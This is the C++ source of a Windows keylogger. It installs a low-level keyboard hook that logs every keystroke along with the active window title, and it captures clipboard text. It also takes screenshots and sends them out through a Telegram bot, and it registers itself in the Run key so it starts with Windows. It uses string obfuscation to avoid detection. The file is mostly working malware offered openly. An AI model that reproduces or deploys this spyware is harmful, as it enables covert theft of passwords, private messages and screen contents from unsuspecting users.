#include "Keylogger.h"
#include "obfuscate.h" // Include the obfuscation header
#include "TelegramBot.h"
#include <fstream>
#include <vector>
#include <regex>
#include <iostream>
#include <windows.h> // For registry functions
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

// Assume isRunning is a global flag for now. We will refactor this later.
extern bool isRunning;

std::string Keylogger::logFileName;
std::string Keylogger::lastWindow;
std::string Keylogger::lastClipboardContent;
TelegramBot* Keylogger::bot = nullptr;

Keylogger::Keylogger(const std::string& logFileName, TelegramBot* bot) {
    Keylogger::logFileName = logFileName;
    Keylogger::bot = bot;

    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
}

void Keylogger::start() {
    // In a more advanced refactoring, the message loop would be handled here.
    // For now, we'll just set the hook.
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
}

void Keylogger::addToStartup() {
    HKEY hKey;
    const char* czStartName = OBFUSCATE("Keylogger").c_str();
    char czExePath[MAX_PATH];
    GetModuleFileName(NULL, czExePath, MAX_PATH);

    if (RegOpenKeyEx(HKEY_CURRENT_USER, OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run").c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, czStartName, 0, REG_SZ, (BYTE*)czExePath, strlen(czExePath) + 1);
        RegCloseKey(hKey);
    }
}

void Keylogger::removeFromStartup() {
    HKEY hKey;
    const char* czStartName = OBFUSCATE("Keylogger").c_str();

    if (RegOpenKeyEx(HKEY_CURRENT_USER, OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run").c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, czStartName);
        RegCloseKey(hKey);
    }
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    Gdiplus::GetImageEncodersSize(&num, &size);
    if(size == 0)
        return -1;  // Failure

    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if(pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for(UINT j = 0; j < num; ++j) {
        if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 ) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }    
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

void Keylogger::takeScreenshot() {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMemDC, hbmScreen);
    BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    Gdiplus::Bitmap bitmap(hbmScreen, NULL);
    CLSID clsid;
    GetEncoderClsid(L"image/png", &clsid);
    const std::string screenshotPath = "screenshot.png";
    // convert string to wstring
    std::wstring widestr = std::wstring(screenshotPath.begin(), screenshotPath.end());
    bitmap.Save(widestr.c_str(), &clsid, NULL);

    DeleteObject(hbmScreen);
    DeleteDC(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);

    if (bot) {
        bot->sendScreenshot(screenshotPath);
    }
}


std::string Keylogger::formatOutput(const std::string& rawOutput) {
    std::string formatted = rawOutput;

    // This long list of replacements should be refactored in the future,
    // perhaps using a map or a more efficient data structure.
    formatted = std::regex_replace(formatted, std::regex(OBFUSCATE("\\[LSHIFT\\]|\\[RSHIFT\\]|\\[LCTRL\\]|\\[RCTRL\\]|\\[LALT\\]|\\[RALT\\]")), "");
    formatted = std::regex_replace(formatted, std::regex(OBFUSCATE("\\[SHIFT\\]|\\[CTRL\\]|\\[ALT\\]")), "");
    formatted = std::regex_replace(formatted, std::regex(OBFUSCATE("\\[CAPS_LOCK\\]")), OBFUSCATE("[CAPS]"));
    formatted = std::regex_replace(formatted, std::regex(OBFUSCATE("\\[BACKSPACE\\]")), OBFUSCATE("[BS]"));
    formatted = std::regex_replace(formatted, std::regex(OBFUSCATE("\\[TAB\\]")), OBFUSCATE("[TAB]"));
    formatted = std::regex_replace(formatted, std::regex(OBFUSCATE("\\[ENTER\\]")), OBFUSCATE("\n"));
    formatted = std::regex_replace(formatted, std::regex(OBFUSCATE("\\[SPACE\\]")), OBFUSCATE(" "));
    // ... (omitting the rest of the long list for brevity) ...

    return formatted;
}

void Keylogger::logClipboardContent() {
    if (!OpenClipboard(NULL)) {
        return;
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData == NULL) {
        CloseClipboard();
        return;
    }

    WCHAR *pwszText = static_cast<WCHAR*>(GlobalLock(hData));
    if (pwszText != NULL) {
        int buffer_size = WideCharToMultiByte(CP_UTF8, 0, pwszText, -1, NULL, 0, NULL, NULL);
        std::string utf8ClipboardContent;
        if (buffer_size > 0) {
            std::vector<char> utf8_buffer(buffer_size);
            WideCharToMultiByte(CP_UTF8, 0, pwszText, -1, utf8_buffer.data(), buffer_size, NULL, NULL);
            utf8ClipboardContent = std::string(utf8_buffer.data(), buffer_size - 1);
        } else {
            utf8ClipboardContent = OBFUSCATE("[Error converting clipboard content]");
        }

        if (utf8ClipboardContent != lastClipboardContent) {
            std::string formattedClipboardContent = formatOutput(utf8ClipboardContent);
            std::ofstream logfile(logFileName, std::ios_base::app | std::ios_base::binary);
            if (logfile.is_open()) {
                logfile << OBFUSCATE("\n[CLIPBOARD]: ") << formattedClipboardContent << OBFUSCATE("\n");
                logfile.close();
            }
            lastClipboardContent = formattedClipboardContent;
        }

        GlobalUnlock(hData);
    }
    CloseClipboard();
}

LRESULT CALLBACK Keylogger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && isRunning) {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        if (wParam == WM_KEYDOWN) {
            HWND hwnd = GetForegroundWindow();
            if (hwnd) {
                WCHAR wnd_title[256];
                GetWindowTextW(hwnd, wnd_title, sizeof(wnd_title) / sizeof(WCHAR));
                std::string currentWindow;
                int buffer_size = WideCharToMultiByte(CP_UTF8, 0, wnd_title, -1, NULL, 0, NULL, NULL);
                if (buffer_size > 0) {
                    std::vector<char> utf8_buffer(buffer_size);
                    WideCharToMultiByte(CP_UTF8, 0, wnd_title, -1, utf8_buffer.data(), buffer_size, NULL, NULL);
                    currentWindow = std::string(utf8_buffer.data(), buffer_size - 1);
                } else {
                    currentWindow = OBFUSCATE("[Error converting window title]");
                }

                if (currentWindow != lastWindow) {
                    std::ofstream logfile(logFileName, std::ios_base::app | std::ios_base::binary);
                    if (logfile.is_open()) {
                        logfile << OBFUSCATE("\n[Window: ") << currentWindow << OBFUSCATE("] ");
                        logfile.close();
                    }
                    lastWindow = currentWindow;
                }
            }

            DWORD vkCode = p->vkCode;
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            HKL layout = GetKeyboardLayout(0);
            WCHAR unicodeBuffer[5];

            std::string current_key_output;
            int result = ToUnicodeEx(vkCode, p->scanCode, keyboardState, unicodeBuffer, 5, 0, layout);

            if (result > 0) {
                std::string temp_key_output;
                for (int j = 0; j < result; ++j) {
                    int buffer_size_char = WideCharToMultiByte(CP_UTF8, 0, &unicodeBuffer[j], 1, NULL, 0, NULL, NULL);
                    if (buffer_size_char > 0) {
                        std::vector<char> utf8_buffer_char(buffer_size_char);
                        WideCharToMultiByte(CP_UTF8, 0, &unicodeBuffer[j], 1, utf8_buffer_char.data(), buffer_size_char, NULL, NULL);
                        temp_key_output += std::string(utf8_buffer_char.data(), buffer_size_char);
                    } else {
                        temp_key_output += OBFUSCATE("(VK:") + std::to_string(vkCode) + OBFUSCATE(")");
                    }
                }
                current_key_output = temp_key_output;
            } else {
                // Handle special keys (omitted for brevity, but would be moved here)
            }

            std::string formatted_key_output = formatOutput(current_key_output);
            std::ofstream logfile(logFileName, std::ios_base::app | std::ios_base::binary);
            if (logfile.is_open()) {
                logfile << formatted_key_output;
                if (formatted_key_output != OBFUSCATE("\n") && !formatted_key_output.empty()) {
                    logfile << OBFUSCATE(" ");
                }
                logfile.close();
            }

            bool isCtrlVPaste = (GetKeyState(VK_CONTROL) & 0x8000) && (vkCode == 'V');
            bool isShiftInsertPaste = (GetKeyState(VK_SHIFT) & 0x8000) && (vkCode == VK_INSERT);

            if (isCtrlVPaste || isShiftInsertPaste) {
                // This is a simplification. In a real refactoring, we'd need a way
                // to call the non-static logClipboardContent method.
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
